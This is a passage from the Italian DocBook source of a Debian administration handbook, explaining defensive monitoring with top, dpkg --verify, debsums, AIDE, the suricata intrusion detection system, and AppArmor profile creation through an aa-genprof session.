					<command>top</command> è uno strumento interattivo che mostra l'elenco dei processi attualmente in esecuzione. L'ordinamento predefinito è basato sull'utilizzo corrente del processore e può essere ottenuto con il tasto <keycap>P</keycap>. Altri tipi di ordinamento sono per occupazione di memoria (tasto <keycap>M</keycap>), per tempo totale di processore (tasto <keycap>T</keycap>) e per identificatore di processo (tasto <keycap>N</keycap>). Il tasto <keycap>k</keycap> permette di terminare un processo inserendo il suo identificatore di processo. Il tasto <keycap>r</keycap> permette il <emphasis>renice</emphasis> di un processo, cioè la variazione della sua priorità.
				</para>
				 <indexterm>
					<primary><command>top</command></primary>
				</indexterm>
				 <para>
					Quando il sistema sembra essere sovraccarico, <command>top</command> è uno strumento fondamentale per capire quali processi competono per il tempo di processore o consumano troppa memoria. In particolare, spesso è interessante controllare se il processo che utilizza le risorse corrisponde realmente ad un servizio che la macchina mette a disposizione. Un processo sconosciuto in esecuzione con utente www-data dovrebbe subito saltare all'occhio ed essere controllato, dato che potenzialmente potrebbe essere l'istanza di un programma installato ed eseguito nel sistema attraverso la vulnerabilità di un'applicazione web.
				</para>
				 <para>
					<command>top</command> è uno strumento molto flessibile e le pagine del manuale riportano i dettagli di come modificarne la visualizzazione e adattarla alle abitudini e bisogni personali.
				</para>
				 <para>
					Lo strumento grafico <command>gnome-system-monitor</command> è simile a <command>top</command> e fornisce più o meno le stesse caratteristiche.
				</para>
				 <indexterm>
					<primary><command>gnome-system-monitor</command></primary>
				</indexterm>

			</section>
			 <section id="sect.monitoring-history">
				<title>Storico</title>
				 <indexterm>
					<primary>attività, storico</primary>
				</indexterm>
				 <para>
					Il carico del processore, il traffico di rete e lo spazio libero su disco sono informazioni che variano costantemente. Mantenere uno storico della loro evoluzione spesso è utile nel determinare esattamente come viene utilizzato un computer.
				</para>
				 <indexterm>
					<primary>SNMP</primary>
				</indexterm>
				 <indexterm>
					<primary>Simple Network Management Protocol</primary>
				</indexterm>
				 <para>
					Esistono molti strumenti dedicati a questo compito. La maggior parte può recuperare dati via SNMP (<emphasis>Simple Network Management Protocol</emphasis>) al fine di centralizzare l'informazione. Un ulteriore beneficio è che si possono recuperare dati da elementi di rete che non necessariamente sono computer generici, come ad esempio switch di rete o router dedicati.
				</para>
				 <para>
					Questo libro tratta Munin in dettaglio (vedere <xref linkend="sect.munin" />) come parte di <xref linkend="advanced-administration" xrefstyle="select: label quotedtitle" />. Debian fornisce anche un altro strumento simile, <emphasis role="pkg">cacti</emphasis>. La sua installazione è leggermente più complessa, poiché si basa solo su SNMP. Pur disponendo di un'interfaccia web, capire i concetti coinvolti nella configurazione richiede ancora qualche sforzo. La lettura della documentazione HTML (<filename>/usr/share/doc/cacti/html/index.html</filename>) deve essere considerata un prerequisito.
				</para>
				 <sidebar> <title><emphasis>ALTERNATIVA</emphasis> <command>mrtg</command></title>
				 <indexterm>
					<primary><command>mrtg</command></primary>
				</indexterm>
				 <para>
					<command>mrtg</command> (nel pacchetto che ha lo stesso nome) è un vecchio strumento. Nonostante sia un po' grezzo, può aggregare dati storici e visualizzarli sotto forma di grafici. Il pacchetto comprende una serie di script dedicati alla raccolta dei dati monitorati più diffusi come il carico del processore, il traffico di rete, le visite alle pagine web e così via.
				</para>
				 <para>
					I pacchetti <emphasis role="pkg">mrtg-contrib</emphasis> e <emphasis role="pkg">mrtgutils</emphasis> contengono script di esempio che possono essere utilizzati direttamente.
				</para>
				 </sidebar>
			</section>

		</section>
		 <section>
			<title>Rilevare le modifiche</title>
			 <para>
				Una volta che il sistema è installato e configurato, a meno di aggiornamenti di sicurezza, la maggior parte dei file e directory rimangono statici, dati a parte. È allora interessante fare in modo che i file realmente non possano cambiare: ogni variazione inattesa dovrebbe perciò catturare la nostra attenzione. Questa sezione presenta alcuni strumenti che permettono di monitorare i file e di avvisare l'amministratore quando si verificano cambiamenti non previsti (o semplicemente di elencarli).
			</para>
			 <section id="sect.dpkg-verify">
				<title>Revisione dei Pacchetti con <command>dpkg --verify</command></title>
				 <indexterm>
					<primary><command>dpkg</command></primary>
					<secondary><command>dpkg --verify</command></secondary>
				</indexterm>
				 <sidebar> <title><emphasis>APPROFONDIMENTI</emphasis> Proteggere contro le modifiche degli autori originali</title>
				 <para>
					<command>dpkg --verify</command> è utile nel segnalare variazioni ai file forniti dai pacchetti Debian, ma è inutile se il pacchetto stesso è compromesso, per esempio quando il mirror Debian è compromesso. Proteggersi da questa tipologia di attacchi implica l'uso del sistema di verifica delle firme digitali di APT (vedere <xref linkend="sect.package-authentication" />), e fare in modo di installare solamente i pacchetti da un'origine certificata.
				</para>
				 </sidebar> <para>
					<command>dpkg --verify</command> (o <command>dpkg -V</command>) è un'interessante strumento che permette di trovare i file installati che sono stati modificati (potenzialmente da un hacker), ma questo dovrebbe essere preso con le pinze. Per fare il proprio lavoro si basa su checksum memorizzati sul proprio database dpkg sull'hard disk (posso essere trovati in <filename>/var/lib/dpkg/info/<replaceable>package</replaceable>.md5sums</filename>); un hacker scrupoloso aggiornerà quindi questi file in modo da contenere i nuovi checksum per i file modificati.
				</para>
				 <sidebar> <title><emphasis>FONDAMENTALI</emphasis> File di Imponte Digitali</title>
				 <indexterm>
					<primary>impronta digitale</primary>
				</indexterm>
				 <indexterm>
					<primary>controllo aggiuntivo</primary>
				</indexterm>
				 <indexterm>
					<primary>MD5</primary>
				</indexterm>
				 <indexterm>
					<primary>SHA1</primary>
				</indexterm>
				 <para>
					Promemoria: l'impronta digitale è un valore, spesso numerico (anche se in notazione esadecimale), che contiene una specie di firma del contenuto di un file. Questa firma è calcolata con un algoritmo (MD5 oppure SHA1 sono gli esempi più diffusi) che garantisce con buona probabilità che anche il più piccolo cambiamento nel contenuto del file porti ad una variazione nell'impronta digitale; è conosciuto come "effetto valanga". Ciò permette di usare un'impronta numerica semplice per verificare se il contenuto di un file è stato alterato. Questi algoritmi non sono reversibili; in altre parole, per la maggior parte di questi, conoscere un'impronta digitale non permette di ricavarne il contenuto corrispondente. Recenti progressi matematici sembra abbiano però indebolito la sicurezza di questi principi, ma il loro uso finora non è stato messo in discussione, dal momento che sembra ancora piuttosto difficile creare contenuti differenti con la stessa impronta digitale.
				</para>
				 </sidebar> <para>
					L'esecuzione di <command>dpkg -V</command> verificherà tutti i pacchetti installati e stamperà una riga per ogni file con test fallito. Il formato è uguale a quello di <command>rpm -V</command> dove ogni carattere indica un test su alcuni meta-dati specifici. Purtroppo <command>dpkg</command> non memorizza i meta-dati necessari per la maggior parte dei test e quindi questi saranno contrassegnati con un punto interrogativo. Attualmente solo il test di checksum può produrre un "5" sul terzo carattere (quando fallisce).
				</para>
				 
<screen>
<computeroutput># </computeroutput><userinput>dpkg -V</userinput>
<computeroutput>??5??????   /lib/systemd/system/ssh.service
??5?????? c /etc/libvirt/qemu/networks/default.xml
??5?????? c /etc/lvm/lvm.conf
??5?????? c /etc/salt/roster</computeroutput></screen>
				 <para>
					Nell'esempio sopra, dpkg riporta una modifica al file del servizio SSH che l'amministratore ha fatto al file compresso invece di usare un'appropriata sovrascrittura di <filename>/etc/systemd/system/ssh.service</filename> (che potrebbe essere memorizzata in <filename>/etc</filename> come dovrebbe essere ogni altro file di configurazione). Elenca anche più file di configurazione (identificati dalla lettera "c" sul secondo campo) che sono stati legittimamente modificati.
				</para>

			</section>
			 <section id="sect.debsums">
				<title>Controllo dei pacchetti: <command>debsums</command> e i suoi limiti</title>
				 <indexterm>
					<primary><command>debsums</command></primary>
				</indexterm>
				 <para>
					<command>debsums</command> è l'antenato di <command>dpkg -V</command> ed è quindi in gran parte obsoleto.Ha gli stessi limiti di di dpkg. Fortunatamente, alcune delle limitazioni posso eseere aggirate (mentre dpkg non offre questa possibilità).
				</para>
				 <para>
					Dal momento che i dati su disco non possono essere sicuri, <command>debsums</command> offre la possibilità di fare i controlli sulla base dei file <filename>.deb</filename> anzichè affidarsi al database di dpkg. Per scaricare i file <filename>.deb</filename> fidati di tutti i pacchetti installati, possiamo contare solo sui download autenticati di APT. Questa operazione può essere lenta e noiosa, e quindi non dovrebbe essere considerata una tecnica proattiva da utilizzare in modo abituale.
				</para>
				 
<screen>
<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `grep-status -e 'Status: install ok installed' -n -s Package`</userinput>
<computeroutput>[ ... ]
# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput></screen>
				 <para>
					Da notare che questo esempio utilizza il comando <command>grep-status</command> del pacchetto <emphasis role="pkg">dctrl-tools</emphasis>, che non è installato in modo predefinito.
				</para>

			</section>
			 <section>
				<title>Monitorare i file: AIDE</title>
				 <indexterm>
					<primary><emphasis role="pkg">aide</emphasis> (pacchetto Debian)</primary>
				</indexterm>
				 <para>
					Lo strumento AIDE (<emphasis>Advanced Intrusion Detection Environment</emphasis>) permette di verificare l'integrità dei file e rileva tutti i cambiamenti rispetto ad una immagine valida archiviata del sistema. Questa immagine viene memorizzata in un database (<filename>/var/lib/aide/aide.db</filename>) contenente le informazioni significative di tutti i file del sistema (impronte digitali, permessi, data e ora e così via). Questo database viene generato inizialmente con <command>aideinit</command>; esso viene poi utilizzato su base giornaliera (dallo script <filename>/etc/cron.daily/aide</filename>) per verificare che non sia cambiato nulla di significativo. Quando viene rilevata una modifica, AIDE la elenca nei file di log (<filename>/var/log/aide/*.log</filename>) e invia i risultati via email all'amministratore.
				</para>
				 <sidebar> <title><emphasis>IN PRATICA</emphasis> Proteggere il database</title>
				 <para>
					Dal momento che AIDE usa un database locale per confrontare lo stato dei file, l'affidabilità dei suoi risultati è direttamente legata alla validità del suo database. Se un autore di un attacco acquisisce i permessi di root su un sistema compromesso, sarà in grado di sostituire il database per nascondere le sue tracce. Una possibile soluzione è quella di salvare i relativi dati su un supporto a sola lettura.
				</para>
				 </sidebar> <para>
					Sono presenti molte opzioni in <filename>/etc/default/aide</filename> per modificare il comportamento del pacchetto <emphasis role="pkg">aide</emphasis>. La configurazione vera e propria di AIDE viene memorizzata in <filename>/etc/aide/aide.conf</filename> e <filename>/etc/aide/aide.conf.d/</filename> (in realtà, questi file vengono utilizzati da <command>update-aide.conf</command> per generare <filename>/var/lib/aide/aide.conf.autogenerated</filename>). La configurazione indica quali proprietà di quali file devono essere controllate. Per esempio, il contenuto dei file di log cambia regolarmente, e tali cambiamenti possono essere ignorati fino a quando i permessi di questi file rimangono invariati, ma sia il contenuto che i permessi dei programmi eseguibili devono rimanere costanti. Anche se non molto complessa, la sintassi della configurazione non è del tutto intuitiva, ed è quindi consigliato leggere la pagina di manuale <citerefentry><refentrytitle>aide.conf</refentrytitle>
					 <manvolnum>5</manvolnum></citerefentry>.
				</para>
				 <para>
					Una nuova versione del database è generata giornalmente in <filename>/var/lib/aide/aide.db.new</filename>; se tutte le variazioni raccolte sono legittime, viene usato per sostituire il database di riferimento.
				</para>
				 <sidebar> <title><emphasis>ALTERNATIVE</emphasis> Tripwire e Samhain</title>
				 <para>
					Tripwire è molto simile ad AIDE; anche la sintassi del file di configurazione è bene o male la stessa. La principale novità fornita da <emphasis role="pkg">tripwire</emphasis> è il meccanismo di firma del file di configurazione, affinché un autore di un attacco non possa associarlo a una diversa versione del database di riferimento.
				</para>
				 <para>
					Anche Samhain offre caratteristiche simili, oltre ad alcune funzioni per permettere la rilevazione dei rootkit (vedere il riquadro <xref linkend="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages" />). Può anche essere distribuito globalmente in rete, memorizzando i suoi risultati in un server centrale (con firma).
				</para>
				 </sidebar> <sidebar id="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages"> <title><emphasis>APPROFONDIMENTI</emphasis> I pacchetti <emphasis role="pkg">checksecurity</emphasis> e <emphasis role="pkg">chkrootkit</emphasis>/<emphasis role="pkg">rkhunter</emphasis></title>
				 <indexterm>
					<primary><emphasis role="pkg">checksecurity</emphasis></primary>
				</indexterm>
				 <para>
					Il primo di questi pacchetti contiene numerosi script brevi che eseguono controlli di base sul sistema (password vuote, nuovi file con setuid e così via) e avvertono l'amministratore se necessario. Nonostante il suo nome esplicito, un amministratore non dovrebbe affidarsi solamente ad esso per garantire la sicurezza di un sistema Linux.
				</para>
				 <para>
					I pacchetti <emphasis role="pkg">chkrootkit</emphasis> e <emphasis role="pkg">rkhunter</emphasis> permettono di cercare <emphasis>rootkit</emphasis> potenzialmente installati nel sistema. Come promemoria, un rootkit è una parte di software progettata per nascondere il fatto che il sistema è compromesso mentre mantiene in modo discreto il controllo sulla macchina. I test non sono affidabili al 100%, ma solitamente riescono ad attirare l'attenzione dell'amministratore su potenziali problemi.
				</para>
				 </sidebar>
			</section>

		</section>
		 <section id="sect.intrusion-detection">
			<title>Rilevare intrusioni (IDS/NIDS)</title>
			 <indexterm>
				<primary>intrusione, rilevazione</primary>
			</indexterm>
			 <indexterm>
				<primary>rilevazione delle intrusioni</primary>
			</indexterm>
			 <indexterm>
				<primary>IDS</primary>
			</indexterm>
			 <indexterm>
				<primary>sistema di rilevazione delle intrusioni</primary>
			</indexterm>
			 <indexterm>
				<primary>NIDS</primary>
			</indexterm>
			 <indexterm>
				<primary>Rete</primary>
				<secondary>IDS</secondary>
			</indexterm>
			 <sidebar> <title><emphasis>FONDAMENTALI</emphasis> «Denial of service»</title>
			 <indexterm>
				<primary>denial of service</primary>
			</indexterm>
			 <para>
				Un attacco «denial of service» ha un solo scopo: bloccare la disponibilità di un servizio. Che un attacco di questo tipo implichi il sovraccarico del server tramite interrogazioni o lo sfruttamento di un bug, il risultato finale è il medesimo: il servizio non è più fruibile. Gli utenti ordinari sono scontenti, e il soggetto che ospita il servizio di rete preso di mira subisce una perdita di reputazione (e probabilmente di ricavi, per esempio se il servizio è un sito di e-commerce).
			</para>
			 <para>
				Un attacco di questo tipo si presenta talvolta "distribuito"; di solito si causa un sovraccarico del server attraverso una grande quantità di interrogazioni provenienti da numerose sorgenti distinte portando all'incapacità di rispondere alle interrogazioni legittime. A queste tipologie di attacchi sono stati associati acronimi ben conosciuti: <acronym>DDoS</acronym> e <acronym>DoS</acronym> (a seconda che il denial of service sia distribuito o meno).
			</para>
			 </sidebar> <para>
				<command>suricata</command> (nel pacchetto Debian con lo stesso nome) è un NIDS — un <emphasis>Network Intrusion Detection System</emphasis>. La sua funzione è quella di mettersi in ascolto sulla rete e cercare di rilevare tentativi di infiltrazione e/o atti ostili (inclusi attacchi denial of service). Tutti questi eventi vengono raccolti in file multipli in <filename>/var/log/suricata</filename>. Ci sono strumenti di terze parti (Kibana/logstash) per consultare al meglio i dati raccolti. <ulink type="block" url="http://suricata-ids.org" /> <ulink type="block" url="https://www.elastic.co/products/kibana" />
			</para>
			 <indexterm>
				<primary><command>snort</command></primary>
			</indexterm>
			 <indexterm>
				<primary><command>suricata</command></primary>
			</indexterm>
			 <sidebar> <title><emphasis>ATTENZIONE</emphasis> Raggio d'azione</title>
			 <para>
				L'efficacia di <command>suricata</command> è limitata al traffico che transita sull'interfaccia di rete monitorata. Ovviamente non sarà in grado di rilevare alcunché se non può osservare il traffico reale. Quando è collegato ad uno switch di rete, rileverà quindi solo gli attacchi alla macchina nella quale è in esecuzione, cosa che probabilmente non è ciò che si desidera. La macchina che ospita <command>suricata</command> dovrà perciò essere connessa ad una porta "mirror" dello switch, che è solitamente riservata a collegare altri switch e quindi rileva il traffico complessivo.
			</para>
			 </sidebar> <para>
				La configurazione di suricata implica la configurazione e la modifica di <filename>/etc/suricata/suricata-debian.yaml</filename>, che è molto lunga poichè ogni parametro è abbondantemente commentato. Una configurazione minima richiede che venga descritto l'intervallo di indirizzi coperti dalla rete locale (parametro <literal>HOME_NET</literal>). In pratica, questo significa l'insieme di tutti i potenziali obiettivi d'attacco. Ma per ottenere la maggior parte di queste cose è richiesta la lettura in tutto ed adattandola alla situazione locale.
			</para>
			 <para>
				Prima di questo, si dovrebbe modificare anche il file <filename>/etc/default/suricata</filename> per definire l'interfaccia di rete da monitorare e consentire lo script di init (impostando <literal>RUN=yes</literal>). Si potrebbe anche voler impostare <literal>LISTENMODE=pcap</literal> perchè per impostazione predefinita <literal>LISTENMODE=nfqueue</literal> richiede un'ulteriore configurazione per funzionare correttamente (il firewall netfilter deve essere configurato per far passare i pacchetti in qualche coda dello spazio utente gestito da suricata tramite il target <literal>NFQUEUE</literal>).
			</para>
			 <para>
				Per rilevare un comportamento malevolo, <command>suricata</command> ha bisogno di un insieme di regole di monitoraggio: è possibile trovare le regole nel pacchetto <emphasis role="pkg">snort-rules-default</emphasis>. <command>snort</command> è il riferimento storico nell'ecosistema IDS e <command>suricata</command> è in grado di riutilizzare le regole scritte per esso. Purtroppo questo pacchetto manca da <emphasis role="distribution">Debian Jessie</emphasis> e deve essere recuperato da un altro rilascio di Debian come <emphasis role="distribution">Testing</emphasis> o <emphasis role="distribution">Unstable</emphasis>.
			</para>
			 <para>
				In alternativa, può essere usato <command>oinkmaster</command> (nel apchhetto dello stesso nome) per scaricare di set di regole di Snort da fonti esterne.
			</para>
			 <sidebar> <title><emphasis>APPROFONDIMENTI</emphasis> Integrazione con <command>prelude</command></title>
			 <para>
				Prelude permette il monitoraggio centralizzato delle informazioni di sicurezza. La sua architetture modulare fornisce un server (il <emphasis>manager</emphasis> in <emphasis role="pkg">prelude-manager</emphasis>) che raccoglie gli allarmi generati da <emphasis>sensori</emphasis> di varie tipologie.
			</para>
			 <para>
				Suricata può essere configurato come un sensore. Altre possibilità includono <emphasis>prelude-lml</emphasis> (<emphasis>Log Monitor Lackey</emphasis>) che controlla i file di log (in maniera del tutto simile a <command>logcheck</command>, descritto in <xref linkend="sect.logcheck" />).
			</para>
			 <indexterm>
				<primary><command>prelude</command></primary>
			</indexterm>
			 </sidebar>
		</section>

	</section>
	 <section id="sect.apparmor">
		<title>Introduzione a AppArmor</title>
		 <indexterm>
			<primary>AppArmor</primary>
		</indexterm>
		 <section id="sect.apparmor-principles">
			<title>Princìpi</title>
			 <para>
				AppArmor è un sistema di <emphasis>Mandatory Access Control (Controllo Accesso Obbligatorio)</emphasis> costruito sull'interfaccia LSM (<emphasis>Linux Security Modules</emphasis>) di Linux. In pratica, il kernel interroga AppArmor prima di ogni chiamata di sistema per sapere se il processo è autorizzato ad eseguire una data operazione. Attraverso questo meccanismo, AppArmor confina programmi ad una serie limitata di risorse.
			</para>
			 <indexterm>
				<primary><emphasis>Controllo Accesso Obbligatorio</emphasis></primary>
			</indexterm>
			 <indexterm>
				<primary><emphasis>Moduli Sicurezza Linux</emphasis></primary>
			</indexterm>
			 <para>
				AppArmor applica una serie di regole (note come "profilo") su ciascun programma. Il profilo applicato dal kernel dipende dal percorso di installazione del programma in esecuzione. Al contrario di SELinux (discusso nella <xref linkend="sect.selinux" />), le norme applicate non dipendono l'utente. Tutti gli utenti devono sottostare allo stesso insieme di regole quando è in esecuzione lo stesso programma (ma le autorizzazioni utente tradizionali sono ancora valide e potrebbero causare un comportamento diverso!).
			</para>
			 <para>
				I profili AppArmor sono memorizzati in <filename>/etc/apparmor.d/</filename> e contengono un elenco delle regole di controllo d'accesso alle risorse che ogni programma può utilizzare. I profili sono compilati e caricati nel kernel dal comando <command>apparmor_parser</command>. Ogni profilo può essere caricato sia in esecuzione sia in complaining mode. La prima fa rispettare la policy e registra i tentativi di violazione, mentre la seconda non applica la policy ma registra sempre le chiamate di sistema che sarebbero state negate.
			</para>

		</section>
		 <section id="sect.apparmor-setup">
			<title>Abilitazione di AppArmor e gestione dei profili di AppArmor</title>
			 <para>
				Supporto ad AppArmor è integrato nei kernel standard forniti da Debian. Abilitazione AppArmor è quindi solo una questione di installare alcuni pacchetti e l'aggiunta di alcuni parametri alla riga di comando del kernel:
			</para>
			 
<screen><computeroutput># </computeroutput><userinput>apt install apparmor apparmor-profiles apparmor-utils
</userinput><computeroutput>[...]
# </computeroutput><userinput>perl -pi -e 's,GRUB_CMDLINE_LINUX="(.*)"$,GRUB_CMDLINE_LINUX="$1 apparmor=1 security=apparmor",' /etc/default/grub
</userinput><computeroutput># </computeroutput><userinput>update-grub
</userinput></screen>
			 <para>
				Dopo un riavvio, AppArmor è funzionante e <command>aa-status</command> lo confermerà in fretta:
			</para>
			 
<screen>
<computeroutput># </computeroutput><userinput>aa-status</userinput>
<computeroutput>apparmor module is loaded.
44 profiles are loaded.
9 profiles are in enforce mode.
   /usr/bin/lxc-start
   /usr/lib/chromium-browser/chromium-browser//browser_java
[...]
35 profiles are in complain mode.
   /sbin/klogd
[...]
3 processes have profiles defined.
1 processes are in enforce mode.
   /usr/sbin/libvirtd (1295) 
2 processes are in complain mode.
   /usr/sbin/avahi-daemon (941) 
   /usr/sbin/avahi-daemon (1000) 
0 processes are unconfined but have a profile defined.</computeroutput></screen>
			 <sidebar> <title><emphasis>NOTA</emphasis> Altri profili AppArmor</title>
			 <para>
				Il pacchetto <emphasis role="pkg">apparmor-profiles</emphasis> contiene i profili gestiti a monte dalla comunità AppArmor. Per ottenere ancora più profili è possibile installare <emphasis role="pkg">apparmor-profiles-extra</emphasis> che contiene i profili sviluppati da Ubuntu e Debian.
			</para>
			 </sidebar> <para>
				Lo stato di ogni profilo può essere scambiato tra la modalità enforce e complain con le chiamate di <command>aa-enforce</command> e <command>aa-complain</command> passando come parametro o il percorso del file eseguibile oppure il percorso del file della policy. Inoltre un profilo può essere completamente disabilitato con <command>aa-disable</command> o messo in modalità di controllo (per registrare anche le chiamate di sistema accettate) con <command>aa-audit</command>.
			</para>
			 
<screen>
<computeroutput># </computeroutput><userinput>aa-enforce /usr/sbin/avahi-daemon</userinput>
<computeroutput>Setting /usr/sbin/avahi-daemon to enforce mode.</computeroutput>
<computeroutput># </computeroutput><userinput>aa-complain /etc/apparmor.d/usr.bin.lxc-start</userinput>
<computeroutput>Setting /etc/apparmor.d/usr.bin.lxc-start to complain mode.</computeroutput>
</screen>

		</section>
		 <section id="sect.apparmor-new-profile">
			<title>Creare un nuovo profilo</title>
			 <para>
				Anche se la creazione di un profilo di AppArmor è piuttosto facile, la maggior parte dei programmi non ne hanno uno. In questa sezione verròà mostrato come creare un nuovo profilo da zero solo utilizzando il programma di destinazione e lasciando che AppArmor monitori le chiamate che il sistema fa e le risorse a cui accede.
			</para>
			 <para>
				I programmi più importanti che devono essere monitorati sono i programmi che si affacciano sulla rete che come tali sono i più probabili obiettivi di aggressori remoti. Per questo AppArmor fornisce il comodo comando <command>aa-unconfined</command> per elencare i programmi che non hanno un profilo associato che sono esposti ad un socket di rete aperto. Con l'opzione <literal>--paranoid</literal> si ottengono tutti i processi non confinati che hanno una connessione di rete attiva.
			</para>
			 
<screen>
<computeroutput># </computeroutput><userinput>aa-unconfined</userinput>
<computeroutput>801 /sbin/dhclient not confined
890 /sbin/rpcbind not confined
899 /sbin/rpc.statd not confined
929 /usr/sbin/sshd not confined
941 /usr/sbin/avahi-daemon confined by '/usr/sbin/avahi-daemon (complain)'
988 /usr/sbin/minissdpd not confined
1276 /usr/sbin/exim4 not confined
1485 /usr/lib/erlang/erts-6.2/bin/epmd not confined
1751 /usr/lib/erlang/erts-6.2/bin/beam.smp not confined
19592 /usr/lib/dleyna-renderer/dleyna-renderer-service not confined</computeroutput>
</screen>
			 <para>
				Nell'esempio seguente, cercheremo quindi di creare un profilo per <command>/sbin/dhclient</command>. Per questo useremo <command>aa-genprof dhclient</command>. Vi invitiamo ad utilizzare l'applicazione in un'altra finestra e una volta finito tornare a <command>aa-genprof</command> per cercare eventi AppArmor nei log di sistema e convertire quei log in regole d'accesso. Per ogni evento registrato, verranno suggerite una o più regole che è possibile approvare o modificare ulteriormente in diversi modi:
			</para>
			 
<screen>
<computeroutput># </computeroutput><userinput>aa-genprof dhclient</userinput>
<computeroutput>Writing updated profile for /sbin/dhclient.
Setting /sbin/dhclient to complain mode.

Before you begin, you may wish to check if a
profile already exists for the application you
wish to confine. See the following wiki page for
more information:
http://wiki.apparmor.net/index.php/Profiles

Please start the application to be profiled in
another window and exercise its functionality now.

Once completed, select the "Scan" option below in 
order to scan the system logs for AppArmor events. 

For each AppArmor event, you will be given the 
opportunity to choose whether the access should be 
allowed or denied.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
Reading log entries from /var/log/audit/audit.log.

Profile:  /sbin/dhclient <co id="aa-genprof-execute"></co>
Execute:  /usr/lib/NetworkManager/nm-dhcp-helper
Severity: unknown

(I)nherit / (C)hild / (P)rofile / (N)amed / (U)nconfined / (X) ix On / (D)eny / Abo(r)t / (F)inish
<userinput>P</userinput>
Should AppArmor sanitise the environment when
switching profiles?

Sanitising environment is more secure,
but some applications depend on the presence
of LD_PRELOAD or LD_LIBRARY_PATH.

(Y)es / [(N)o]
<userinput>Y</userinput>
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.
Complain-mode changes:
WARN: unknown capability: CAP_net_raw

Profile:    /sbin/dhclient <co id="aa-genprof-capability"></co>
Capability: net_raw
Severity:   unknown

[(A)llow] / (D)eny / (I)gnore / Audi(t) / Abo(r)t / (F)inish
<userinput>A</userinput>
Adding capability net_raw to profile.

Profile:  /sbin/dhclient <co id="aa-genprof-read"></co>
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
  3 - #include &lt;abstractions/nameservice&gt; 
  4 - #include &lt;abstractions/totem&gt; 
 [5 - /etc/nsswitch.conf]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>3</userinput>

Profile:  /sbin/dhclient
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
 [3 - #include &lt;abstractions/nameservice&gt;]
  4 - #include &lt;abstractions/totem&gt; 
  5 - /etc/nsswitch.conf 
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding #include &lt;abstractions/nameservice&gt; to profile.

Profile:  /sbin/dhclient
Path:     /proc/7252/net/dev
Mode:     r
Severity: 6

  1 - /proc/7252/net/dev 
 [2 - /proc/*/net/dev]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/*/net/dev r to profile

[...]
Profile:  /sbin/dhclient <co id="aa-genprof-write"></co>
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

 [1 - /run/dhclient-eth0.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>N</userinput>

Enter new path: /run/dhclient*.pid

Profile:  /sbin/dhclient
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

  1 - /run/dhclient-eth0.pid 
 [2 - /run/dhclient*.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /run/dhclient*.pid w to profile

[...]
Profile:  /usr/lib/NetworkManager/nm-dhcp-helper <co id="aa-genprof-other-profile"></co>
Path:     /proc/filesystems
Mode:     r
Severity: 6

 [1 - /proc/filesystems]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/filesystems r to profile

= Changed Local Profiles =

The following local profiles were changed. Would you like to save them?

 [1 - /sbin/dhclient]
  2 - /usr/lib/NetworkManager/nm-dhcp-helper 
(S)ave Changes / Save Selec(t)ed Profile / [(V)iew Changes] / View Changes b/w (C)lean profiles / Abo(r)t
<userinput>S</userinput>
Writing updated profile for /sbin/dhclient.
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
<userinput>F</userinput>
Setting /sbin/dhclient to enforce mode.
Setting /usr/lib/NetworkManager/nm-dhcp-helper to enforce mode.

Reloaded AppArmor profiles in enforce mode.

Please consider contributing your new profile!
See the following wiki page for more information:
http://wiki.apparmor.net/index.php/Profiles

Finished generating profile for /sbin/dhclient.</computeroutput></screen>
			 <para>
				Notare che il programma non visualizza i caratteri di controllo indietro che si digitano ma per la chiarezza espositiva sono stati inclusi nella trascrizione precedente.
			</para>
			 <calloutlist>
				<callout arearefs="aa-genprof-execute">
					<para>
						Il primo evento rilevato è l'esecuzione di un altro programma. In tal caso, si dispone di più opzioni: è possibile eseguire il programma con il profilo del processo padre (la scelta “Inherit”), è possibile eseguirlo con il proprio profilo dedicato (le scelte "Profile" e "Named", differiscono solo per la possibilità di utilizzare un nome di profilo arbitrario), è possibile eseguirlo con un sub-profilo del processo padre (la scelta "Child"), è possibile eseguirlo senza alcun profilo (la scelta "Unconfined") o si può decidere di non farlo eseguire a nessuno (la scelta "Deny").
					</para>
					 <para>
						Si noti che quando si sceglie di eseguire il programma sotto un profilo dedicato che non esiste ancora, lo strumento creerà il profilo mancante per voi ed allo stesso tempo proporrà delle regole per tale profilo.
					</para>

				</callout>
				 <callout arearefs="aa-genprof-capability">
					<para>
						A livello di kernel, i poteri speciali dell'utente root vengono suddivisi in "capacità". Quando una chiamata di sistema richiede una capacità specifica, AppArmor verificherà se il profilo permette al programma di fare uso di questa capacità.
					</para>

				</callout>
				 <callout arearefs="aa-genprof-read">
					<para>
